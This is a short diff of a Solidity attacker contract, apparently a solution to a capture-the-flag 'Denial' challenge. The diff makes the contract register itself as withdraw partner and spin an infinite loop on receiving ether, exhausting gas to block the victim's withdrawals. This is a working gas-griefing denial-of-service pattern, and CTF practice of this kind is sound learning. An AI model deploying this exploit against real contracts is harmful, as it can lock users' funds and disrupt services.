@@ -1,16 +1,14 @@
-pragma solidity 0.6.12;
+pragma solidity 0.8.15;
 
-import "hardhat/console.sol";
-
+import "../challenge/Denial.sol";
 contract DenialAttacker {
     uint256 gasWasted;
     function attack(address target) external {
         payable(target).call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
     }
 
-    fallback() external payable {
+    receive() external payable {
         while(true) {
-            console.log(gasleft());
-        }
+        } 
     }
 }
